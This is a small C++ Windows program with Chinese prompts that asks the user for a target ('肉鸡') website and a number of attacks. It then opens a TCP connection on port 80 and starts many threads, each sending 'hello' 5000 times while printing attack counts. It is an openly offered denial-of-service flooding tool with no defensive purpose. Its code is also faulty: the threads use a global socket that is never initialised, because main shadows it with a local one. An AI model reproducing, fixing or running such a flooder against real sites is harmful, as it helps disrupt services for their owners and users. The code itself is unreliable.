#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <WinSock2.h>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")
DWORD WINAPI wordProc(LPVOID lpParm);
SOCKET sockclient;
int main() {
	char url[200];
	printf("请输入肉鸡官网链接：\n");
	scanf_s("%s", url);
	int n;
	printf("请输入攻击次数：\n");
	scanf_s("%d",&n);

	WSADATA wd;
	if (0 != (WSAStartup(MAKEWORD(2, 2), &wd)))
	{
		printf("初始化网络失败.\n");
			return 0;
	}
	if (LOBYTE(wd.wVersion) != 2 || HIBYTE(wd.wVersion) != 2)
	{
		printf("请求的版本与实际加载版本不一致.\n");
		return 0;
	}
	SOCKET sockclient = socket(AF_INET,SOCK_STREAM,0);
	if(sockclient == INVALID_SOCKET)
	{
		printf("创建套接字失败.\n");
		return 0;
	}
	else {
		printf("连上了.\n");
	}//www.baidu.com
	hostent* host = gethostbyname(url);
	if (host == NULL) {
		printf("域名解析失败.\n");
		return 0;
	}
	sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(80);
	memcpy(&sa.sin_addr, host->h_addr, 4);
	if(SOCKET_ERROR == connect(sockclient,(sockaddr*)&sa,sizeof(sockaddr)))
	{
		printf("链接网站失败.\n");
	}

	/*char sendBuf[250] = { 0 };
	sprintf(sendBuf,"Hello wolrd\r\n\r\n");
	char recvBuf[512] = { 0 };
	if (NULL == (send(sockclient, sendBuf, strlen(sendBuf), 0)));
	{
		printf("send error!");
	}
	char ch = '\0';
	std::string str;
	while (recv(sockclient, recvBuf, sizeof(recvBuf), 0))
	{
		str += ch;
	}
	printf("%s\n",str.c_str());*/
	
	int i = 0;
	char sendBuf[250] = "hello\r\n\r\n";
	while (i < n)
	{
		
		CreateThread(NULL, 0,wordProc,0,0,NULL);
		i++;
	}
	system("pause");
	return 0;
}
DWORD WINAPI wordProc(LPVOID lpParm) {
	int i = 0;
	while (i < 5000)
	{
		printf("攻击了:%d次\n", i);
		char sendBuf[250] = "hello";
		send(sockclient, sendBuf, strlen(sendBuf), 0);
		i++;
	}
	
return 0;
}